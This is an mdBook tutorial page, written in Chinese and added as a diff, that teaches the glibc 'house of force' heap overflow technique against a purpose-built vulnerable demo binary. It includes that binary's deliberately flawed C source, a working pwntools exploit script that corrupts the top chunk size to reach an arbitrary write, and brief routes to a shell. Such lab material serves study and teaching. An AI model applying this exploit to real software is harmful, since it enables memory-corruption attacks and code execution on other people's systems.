@@ -1,0 +1,406 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>House of force - glibc_heap_exploit_technique</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="../introduction/Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="../house_of_force/house_of_force.html" class="active"><strong aria-hidden="true">2.</strong> House of force</a></li><li class="chapter-item expanded "><a href="../fastbin_dup/fastbin_dup.html"><strong aria-hidden="true">3.</strong> fastbin_dup</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">glibc_heap_exploit_technique</h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="house-of-force"><a class="header" href="#house-of-force">house of force</a></h1>
+<p>本文介绍一种被称为<strong>house of force</strong>的 heap溢出利用技巧。</p>
+<p>这是一种通过溢出改写top_chunk header信息进而达到任意写技巧。</p>
+<h3 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h3>
+<p>命令行打开<a href="../data/house_of_force">house_of_force</a>  :</p>
+<p><img src="house_of_force.assets/abc.png" alt="" /></p>
+<p>可见demo程序泄露了puts函数以及heap的地址，且提供三个选项：</p>
+<ol>
+<li>
+<p>调用malloc</p>
+<p>调用malloc可以控制申请内存的大小以及输入的内容， 这个功能只能用四次。</p>
+</li>
+<li>
+<p>打印target</p>
+<p>target 是这个程序的全局变量， 且写死为hello，我们第一个目标就是改写它。</p>
+</li>
+<li>
+<p>退出</p>
+</li>
+</ol>
+<p>用<code>ldd</code>查看改该二进制的依赖:</p>
+<p><img src="house_of_force.assets/b.png" alt="b" /></p>
+<p>可见这个二进制的的动态链接库指定了一个自定义的地址，而libc也指向了特定的版本。</p>
+<p>用<code>pwntools</code>下的<code>checksec</code>查看该二进制的基本运行时安全措施:</p>
+<p><img src="house_of_force.assets/c.png" alt="c" /></p>
+<p>我们关注标红部分，No PIE (position independant executable) 意味着这个二进制没有<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>保护。（这是为了减少复杂度故意设置，不过即使打开ASLR，有地址泄露，理论上也不难绕过）RUNPATH是指该二进制运行时的动态链接库的搜索地址（一般来说，该地址非默认时会导致运行的核心调用库被篡改，这是为了链接特定libc库的举措）</p>
+<h3 id="运行时行为debug"><a class="header" href="#运行时行为debug">运行时行为debug</a></h3>
+<p>为方便查看heap的变化，下面采用 <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> 调试, 这是一个gdb 的插件，它集成很多方便的命令，以及提供好看的编码高亮。</p>
+<p>用命令<code>gdb -q ./house_of_force</code> 启动debuger，用命令<code>run</code>(或者简写<code>r</code>), 然后选择1，需要大小的24字节的内存，写入内容aaaa，回车，最后ctrl+c开始debug:</p>
+<p><img src="house_of_force.assets/d.png" alt="d" /></p>
+<p>这时，先用命令<code>vmmap</code>查看当前的memory map:</p>
+<p><img src="house_of_force.assets/e.png" alt="e" /></p>
+<p>蓝色部分显示确实有heap分配了，且开始的位置为0x405000， 与开始时泄露的地址一致。</p>
+<p>我们用命令<code>vis_heap_chunks</code>(或简写<code>vis</code>) 查看当前heap的样子：</p>
+<p><img src="house_of_force.assets/f.png" alt="f" /></p>
+<p>如上图，我们确实看到一个大小为0x20的malloc chunk, 以及我们写入的“aaaa\n”的ASCII码（注意大小端）且指出了top_chunk的位置。</p>
+<p>当然，我们也可以用命令<code>top_chunk</code>来查看top_chunk信息:</p>
+<p><img src="house_of_force.assets/g.png" alt="g" /></p>
+<p>由于我们申请了24字节的内存，这块内存至少可以存储23个a(换行占一个字节)，很自然想到，如果我们写很多a，heap会是怎么样呢？</p>
+<p><img src="house_of_force.assets/gg.png" alt="gg" /></p>
+<p>这时可见原来的0x0000000000020fe1变成了0x6161616161616161，而这恰恰是我们写入的a, 原来的0x0000000000020fe1表示top_chunk的大小，如今被改成了x6161616161616161。</p>
+<p>也就是说我们有机会改写top_chunk的大小，打破heap的边界。</p>
+<p>这就是这个demo的漏洞。下面我们利用这个漏洞来达到任意写。</p>
+<h3 id="任意写"><a class="header" href="#任意写">任意写</a></h3>
+<p>由前面的memory map知道，heap是从0x405000 开始的，而top_chunk的大小可以控制，理论上说0x405000往后走的内存都可以被当做heap，都能被分配，都能被写（前提是它们能被写，否则会有segmen falt，毕竟前面<code>checksec</code>看到NX 是打开的。）但0x405000之前的呢？比如 target</p>
+<p><img src="house_of_force.assets/ggg.png" alt="ggg" /></p>
+<p>target 变量位于0x404070，由前面的memory map 可知其为可写部分（一般来说，非静态全局变量都在这里）但0x404070在heap 0x405000之前，heap 地址只能往大处增长，如何覆盖到一个小的数值？</p>
+<p>容易想到，整数溢出。由于heap的地址只能往大处增长，但不能无穷增长，到最大地址0xffffffffffffffff (32位的是0xffffffff)后，再继续增长就要从0x0开始了，进而有可能覆盖到target。</p>
+<p>基本思想有了，下面描述一下具体做法：</p>
+<ol>
+<li>先malloc一段小内存，写入内容溢出，使得系统误以为top_chunk大小为0xffffffffffffffff</li>
+<li>然后再malloc一段大内存，使得top_chunk位置越过最大内存地址，回到开始，且在target附近</li>
+<li>最后在再malloc一段内存，使得刚好覆盖target的位置，进而我们可以控制target及其附近的内容。</li>
+</ol>
+<p><img src="house_of_force.assets/heap.png" alt="heap" /></p>
+<p>用pwntool编写exp <a href="../house_of_force/house_of_force.py">house_of_force.py</a> </p>
+<pre><code class="language-python">#!/usr/bin/python3
+from pwn import *
+
+elf = context.binary = ELF(&quot;house_of_force&quot;)
+libc = elf.libc
+
+gs = '''
+continue
+'''
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs)
+    else:
+        return process(elf.path)
+
+def malloc(size, data):
+    io.send(&quot;1&quot;)
+    io.sendafter(&quot;malloc size: &quot;, f&quot;{size}&quot;)
+    io.sendafter(&quot;malloc data: &quot;, data)
+    io.recvuntil(&quot;your option is: &quot;)
+
+def delta(x, y):
+    return (0xffffffffffffffff - x) + y
+
+io = start()
+
+io.recvuntil(&quot;puts() @ &quot;)
+libc.address = int(io.recvline(), 16) - libc.sym.puts
+
+io.recvuntil(&quot;heap @ &quot;)
+heap = int(io.recvline(), 16)
+io.recvuntil(&quot;your option is: &quot;)
+io.timeout = 0.1
+
+
+
+log.info(f&quot;heap: 0x{heap:02x}&quot;)
+log.info(f&quot;target: 0x{elf.sym.target:02x}&quot;)
+malloc(24, b&quot;Y&quot;*24 + p64(0xffffffffffffffff))
+distance = delta(heap+0x20, elf.sym.target-0x20)
+malloc(distance, b&quot;a&quot;)
+
+
+log.info(f&quot;delta between heap &amp; main(): 0x{delta(heap, elf.sym.main):02x}&quot;)
+io.interactive()
+</code></pre>
+<p>测试确实改写可target:</p>
+<p><img src="house_of_force.assets/h.png" alt="h" /></p>
+<h3 id="get-shell"><a class="header" href="#get-shell">get shell</a></h3>
+<p>达到任意写get shell 比较容易了，这里提供几个思路:</p>
+<ol>
+<li>通过任意写注入shellcode， malloc hook 触发</li>
+<li>找rop gadget，同样malloc hook 触发。</li>
+<li>ret2libc 调用execve</li>
+</ol>
+<p>这里提供一个调用<code>system,</code>函数的示例： <a href="../data/house_of_force_shell.py">house_of_force_shell.py</a> </p>
+<h3 id="one-more-thing"><a class="header" href="#one-more-thing">one more thing</a></h3>
+<p>在开发这个demo时， 全局变量target 最初我写作<code>char* target</code> 但编译后对应的位置储存的却是 <code>char**</code> 而真正的数据不可写。但改成<code>char target[]</code>后，target的对应地方才直接是数据，这和c语言大部分的教材说的<code>char* a</code>等价于<code>char a[]</code>不符。具体原因要研究编译器的实现，这个后续会进行。</p>
+<p>另外，在默认情况下，函数<code>printf</code>会占用heap来做buffer， 函数<code>setvbuf(stdout, NULL, _IONBF, 0);</code>  可去除这个影响。</p>
+<p>以上实现，可参考demo的源码 <a href="../data/house_of_force.c">house_of_force.c</a> </p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;stdbool.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;malloc.h&gt;
+
+#define NAME &quot;house of force\n&quot;
+#define LINE &quot;-------------------------------\n&quot;
+// gcc -no-pie -Wl,-rpath,../libc/glibc_2.28_no-tcache/,-dynamic-linker,../libc/glibc_2.28_no-tcache/ld.so.2 -g house_of_force.c -o house_of_force
+
+void print_banner(void) {
+    printf(NAME);
+}
+
+void print_leak(void) {
+    printf(&quot;puts() @ %p\n&quot;, &amp;puts);
+    char* a = malloc(0x88);
+    printf(&quot;heap @ %p\n&quot;, a-0x10);
+    free(a);
+}
+
+void print_option(int malloc_count) {
+    printf(&quot;1) malloc %d/4\n&quot;, malloc_count);
+    puts(&quot;2) target&quot;);
+    puts(&quot;3) quit&quot;);
+    printf(&quot;your option is: &quot;);
+}
+
+unsigned long read_num(void) {
+    char buf[31];
+    unsigned long num;
+    read(0, buf, 31);
+    num = strtoul(buf, 0, 10);
+    return num;
+}
+
+void do_malloc(int* malloc_count) {
+    if (*malloc_count &lt;= 3){
+        printf(&quot;malloc size: &quot;);
+        char* buf = malloc(read_num());
+        if (buf != NULL){
+            printf(&quot;malloc data: &quot;);
+            read(0, buf, malloc_usable_size(buf)+8);
+            *malloc_count+=1;
+            printf(LINE);
+        }
+    }
+    else{
+        printf(&quot;Sorry, no more space for you to malloc.\n&quot;);
+        printf(LINE);
+    }
+}
+
+char target[] = &quot;hello&quot;;
+// char* target = &quot;hello&quot;;
+void do_target(char* target) {
+    printf(&quot;The target is: %s\n&quot;, target);
+    printf(LINE);
+}
+
+void do_exit(void) {
+    printf(&quot;exiting...\n&quot;);
+    printf(LINE);
+    exit(0);
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf(LINE);
+    print_banner();
+    printf(LINE);
+    print_leak();
+    printf(LINE);
+
+    int malloc_count = 0;
+    print_option(malloc_count);
+    unsigned long option_num;
+    // char* target = &quot;Have a nice day!&quot;;
+    option_num = read_num();
+    while (true) {
+        switch (option_num) {
+            case 1:
+                do_malloc(&amp;malloc_count);
+                break;
+            case 2:
+                do_target(target);
+                break;
+            case 3:
+                do_exit();
+                break;
+        }   
+        print_option(malloc_count); 
+        option_num = read_num();
+        printf(LINE);
+    }
+    return 0;
+}
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../introduction/Introduction.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../fastbin_dup/fastbin_dup.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../introduction/Introduction.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../fastbin_dup/fastbin_dup.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script type="text/javascript">
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
